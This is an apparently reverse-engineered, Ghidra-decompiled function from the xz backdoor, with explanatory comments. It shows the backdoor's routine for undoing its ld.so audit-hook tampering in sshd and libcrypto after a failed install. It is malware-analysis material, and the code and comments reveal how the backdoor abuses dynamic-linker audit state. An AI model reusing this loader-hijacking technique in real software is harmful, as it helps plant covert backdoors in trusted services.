// /home/kali/xzre-ghidra/xzregh/102770_restore_ldso_audit_state.c
// Function: restore_ldso_audit_state @ 0x102770
// Calling convention: __stdcall
// Prototype: void __stdcall restore_ldso_audit_state(ldso_ctx_t * ldso_ctx)


/*
 * AutoDoc: Restores ld.so audit state after a failed hook install: it writes the saved auditstate bindflags back to libcrypto/sshd, resets
 * libcrypto’s `link_map::l_name` pointer away from the forged basename buffer, clears the `l_audit_any_plt` bit with the recovered
 * mask, and zeros `_dl_naudit`/`_dl_audit` so the dynamic linker no longer believes an audit module is registered. Stage two calls
 * it on failure paths so sshd resumes with the original loader state.
 */

#include "xzre_types.h"

void restore_ldso_audit_state(ldso_ctx_t *ldso_ctx)

{
  u32 *libcrypto_bindflags_slot;
  LinkMapAuditFlags_t *sshd_audit_flag_byte;
  
  if (ldso_ctx != (ldso_ctx_t *)0x0) {
    libcrypto_bindflags_slot = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
    if (libcrypto_bindflags_slot != (u32 *)0x0) {
      // AutoDoc: Reapply the saved libcrypto bindflags so ld.so’s audit hooks see their original mask.
      *libcrypto_bindflags_slot = ldso_ctx->libcrypto_auditstate_bindflags_old_value;
      if (ldso_ctx->libcrypto_l_name != (char **)0x0) {
        // AutoDoc: Restore the libcrypto `l_name` pointer away from the temporary basename buffer (it points back at the auditstate slot we borrowed as a safe address).
        *ldso_ctx->libcrypto_l_name = (char *)libcrypto_bindflags_slot;
      }
    }
    if (ldso_ctx->sshd_auditstate_bindflags_ptr != (u32 *)0x0) {
      // AutoDoc: Mirror the same restoration for sshd’s auditstate structure.
      *ldso_ctx->sshd_auditstate_bindflags_ptr = ldso_ctx->sshd_auditstate_bindflags_old_value;
    }
    sshd_audit_flag_byte = ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
    if (sshd_audit_flag_byte != (byte *)0x0) {
      // AutoDoc: Clear the `l_audit_any_plt` bit the loader set so `_dl_audit` stops forcing our trampolines.
      *sshd_audit_flag_byte = *sshd_audit_flag_byte & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
    }
    if (ldso_ctx->_dl_naudit_ptr != (uint *)0x0) {
      // AutoDoc: Drop `_dl_naudit` back to zero so ld.so forgets about the registered audit module.
      *ldso_ctx->_dl_naudit_ptr = 0;
    }
    if (ldso_ctx->_dl_audit_ptr != (audit_ifaces **)0x0) {
      // AutoDoc: NULL out `_dl_audit` as well so future binds can’t reach into freed hook tables.
      *ldso_ctx->_dl_audit_ptr = (audit_ifaces *)0x0;
    }
  }
  return;
}

